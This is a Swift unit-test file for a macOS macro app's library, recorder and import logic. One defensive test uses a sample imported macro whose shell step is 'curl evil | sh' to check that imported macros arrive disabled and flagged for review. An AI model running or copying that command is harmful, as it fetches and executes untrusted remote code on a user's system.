import XCTest
@testable import MacPocketCore

final class MacroLibraryTests: XCTestCase {
    private let combo = KeyCombo(keyCode: 0, modifiers: [.control, .option])
    private func macro(_ name: String, apps: [String] = [], enabled: Bool = true, trigger: KeyCombo? = nil) -> Macro {
        Macro(name: name, steps: [MacroStep(.text("x"))], trigger: trigger ?? combo, applications: apps, enabled: enabled)
    }

    func testAppSpecificMacroWinsOverGlobal() {
        let library = MacroLibrary(macros: [macro("Genel"), macro("Safari", apps: ["com.apple.Safari"])])
        XCTAssertEqual(library.macro(for: combo, frontmost: "com.apple.Safari")?.name, "Safari")
        XCTAssertEqual(library.macro(for: combo, frontmost: "com.apple.Notes")?.name, "Genel")
        XCTAssertEqual(library.macro(for: combo, frontmost: nil)?.name, "Genel")
    }

    func testNoMatchLetsTheKeyThrough() {
        let library = MacroLibrary(macros: [macro("Safari", apps: ["com.apple.Safari"]), macro("Kapalı", enabled: false)])
        XCTAssertNil(library.macro(for: combo, frontmost: "com.apple.Notes"))
        XCTAssertNil(library.macro(for: KeyCombo(keyCode: 1, modifiers: [.command]), frontmost: "com.apple.Safari"))
    }

    func testConflictsOnlyWithinTheSameScope() {
        let library = MacroLibrary(macros: [macro("A"), macro("B"), macro("C", apps: ["x"]), macro("D", apps: ["x", "y"]),
                                            macro("E", apps: ["z"])])
        let names = Set(library.macros.filter { library.conflicts.contains($0.id) }.map(\.name))
        XCTAssertEqual(names, ["B", "D"])
    }

    func testRepeatsExpandThePlanWithinLimits() {
        var repeated = Macro(name: "r", steps: [MacroStep(.text("a")), MacroStep(.delay(milliseconds: 10))], repeatCount: 3)
        XCTAssertEqual(repeated.plan.count, 6)
        repeated.repeatCount = 500
        XCTAssertEqual(repeated.plan.count, 200, "capped at 100 repeats")
    }

    func testSearchIgnoresCaseAndDiacriticsAndSkipsEmptyOrDisabled() {
        var empty = Macro(name: "Boş")
        empty.steps = []
        let library = MacroLibrary(macros: [macro("Çeviri yap"), macro("Kapalı", enabled: false), empty])
        XCTAssertEqual(library.search("ceviri").map(\.name), ["Çeviri yap"])
        XCTAssertEqual(library.search("").map(\.name), ["Çeviri yap"])
    }

    func testStepProblems() {
        XCTAssertNotNil(MacroAction.text("").problem)
        XCTAssertNotNil(MacroAction.delay(milliseconds: 70_000).problem)
        XCTAssertNotNil(MacroAction.shell(command: "  ").problem)
        XCTAssertNil(MacroAction.template(.keystroke).problem)
        XCTAssertNil(MacroAction.template(.openURL).problem)
    }
}

final class MacroRecorderTests: XCTestCase {
    func testTypingMergesShortcutsSplitAndPausesBecomeDelays() {
        let keys = [
            RecordedKey(keyCode: 4, modifiers: [], characters: "M", time: 0),
            RecordedKey(keyCode: 34, modifiers: [], characters: "e", time: 0.1),
            RecordedKey(keyCode: 0, modifiers: [.command], characters: "a", time: 0.2),
            RecordedKey(keyCode: 36, modifiers: [], characters: "\r", time: 2.2),
            RecordedKey(keyCode: 41, modifiers: [.shift], characters: "Ş", time: 2.3),
        ]
        XCTAssertEqual(MacroRecorder.steps(from: keys), [
            .text("Me"),
            .keystroke(KeyCombo(keyCode: 0, modifiers: [.command])),
            .delay(milliseconds: 2000),
            .keystroke(KeyCombo(keyCode: 36, modifiers: [])),
            .text("Ş"),
        ])
    }

    func testPausesCanBeDropped() {
        let keys = [RecordedKey(keyCode: 0, modifiers: [], characters: "a", time: 0),
                    RecordedKey(keyCode: 11, modifiers: [], characters: "b", time: 5)]
        XCTAssertEqual(MacroRecorder.steps(from: keys, keepPauses: false), [.text("ab")])
    }
}

final class MacroArchiveTests: XCTestCase {
    func testRoundTripWithOwnerOnlyFileAndImportRenewsIdentities() throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("MacroArchiveTests-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: folder) }
        let archive = MacroArchive(file: folder.appendingPathComponent("Macros/library.json"))
        let library = MacroLibrary(macros: [Macro(name: "Selam", steps: [MacroStep(.text("Merhaba")), MacroStep(.shortcut(name: "Gün"))],
                                                  trigger: KeyCombo(keyCode: 1, modifiers: [.control, .option]), repeatCount: 2)])
        try archive.save(library)
        XCTAssertEqual(try archive.load(), library)
        let permissions = try FileManager.default.attributesOfItem(atPath: archive.file.path)[.posixPermissions] as? NSNumber
        XCTAssertEqual(permissions?.intValue, 0o600)
        let imported = try MacroArchive.importing(Data(contentsOf: archive.file))
        XCTAssertEqual(imported.first?.name, "Selam")
        XCTAssertNotEqual(imported.first?.id, library.macros[0].id)
        XCTAssertEqual(imported.first?.steps.map(\.action), library.macros[0].steps.map(\.action))
    }

    func testImportedMacrosArriveOffMarkedForReviewAndWithoutPlainKeyTriggers() throws {
        let hostile = MacroLibrary(macros: [Macro(name: "Kötü", steps: [MacroStep(.shell(command: "curl evil | sh"))],
                                                  trigger: KeyCombo(keyCode: 0, modifiers: []))])
        let imported = try MacroArchive.importing(JSONEncoder().encode(hostile))
        let macro = try XCTUnwrap(imported.first)
        XCTAssertFalse(macro.enabled)
        XCTAssertEqual(macro.needsReview, true)
        XCTAssertNil(macro.trigger, "a trigger without ⌘, ⌃ or ⌥ is dropped")
        XCTAssertEqual(macro.sensitiveSteps, [.shell(command: "curl evil | sh")])
        var reviewedButEnabled = macro
        reviewedButEnabled.enabled = true
        let library = MacroLibrary(macros: [reviewedButEnabled])
        XCTAssertTrue(library.triggers.isEmpty)
        XCTAssertTrue(library.search("").isEmpty, "still needs review even if switched on")
    }

    func testPlainKeyTriggersAreNeverWatchedEvenFromAHandEditedLibrary() {
        let plain = KeyCombo(keyCode: 0, modifiers: [.shift])
        let library = MacroLibrary(macros: [Macro(name: "a", steps: [MacroStep(.text("x"))], trigger: plain)])
        XCTAssertTrue(library.triggers.isEmpty)
        XCTAssertNil(library.macro(for: plain, frontmost: nil))
    }

    func testLibrariesSavedBeforeReviewExistedStillDecode() throws {
        let json = #"{"macros":[{"id":"6B1C2E9A-1111-4E2B-9C1A-000000000001","name":"Eski","symbol":"wand.and.stars","steps":[],"applications":[],"repeatCount":1,"enabled":true}]}"#
        let library = try JSONDecoder().decode(MacroLibrary.self, from: Data(json.utf8))
        XCTAssertNil(library.macros.first?.needsReview)
    }
}
